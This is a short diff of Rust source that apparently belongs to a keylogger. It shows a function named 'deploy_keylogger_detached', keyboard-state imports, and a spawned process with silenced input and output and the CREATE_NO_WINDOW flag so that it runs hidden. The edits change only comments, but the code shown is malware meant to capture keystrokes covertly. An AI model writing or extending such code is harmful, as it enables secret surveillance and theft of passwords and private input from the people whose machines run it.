@@ -1,7 +1,7 @@
 use device_query::{DeviceQuery, DeviceState, Keycode};
 
 #[cfg(target_os = "windows")]
-use std::os::windows::process::CommandExt; // Required for `creation_flags`
+use std::os::windows::process::CommandExt; 
 
 use std::process::{Command, Stdio};
 use std::time::Duration;
@@ -19,7 +19,7 @@ pub fn deploy_keylogger_detached() -> Result<(), Box<dyn std::error::Error>> {
             .stdin(Stdio::null())
             .stdout(Stdio::null())
             .stderr(Stdio::null())
-            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .creation_flags(0x08000000) // DOESNT CREATE A WINDOW
             .spawn()?;
     }
 
